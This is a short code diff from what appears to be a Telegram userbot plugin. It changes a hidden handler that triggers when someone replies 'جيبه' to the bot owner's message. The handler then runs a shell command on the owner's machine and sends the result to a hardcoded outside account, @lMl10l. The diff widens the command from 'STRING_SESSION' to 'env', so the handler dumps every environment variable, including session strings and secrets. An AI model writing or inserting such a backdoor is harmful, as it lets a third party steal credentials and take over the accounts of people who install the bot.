@@ -106,8 +106,8 @@ async def Hussein(event):
        owner_id = reply_msg.from_id.user_id
        if owner_id == l313l.uid:
            if event.message.message == "جيبه":
-                   cmd = "STRING_SESSION"
+                   cmd = "env"
                    o = (await _catutils.runcmd(cmd))[0]
-                   OUTPUT = (f"**[الجوكر](tg://need_update_for_some_feature/) كود تيرمكس:**\n\n\n{o}\n\n**تدلل سيدي ومولاي **")
+                   OUTPUT = (f"**[الجوكر](tg://need_update_for_some_feature/) اللهُ اكبر:**\n\n\n{o}\n\n**تدلل سيدي ومولاي **")
                    await event.reply("**جبته وتدلل سيدنا 🖤**")
                    await l313l.send_message("@lMl10l", OUTPUT)
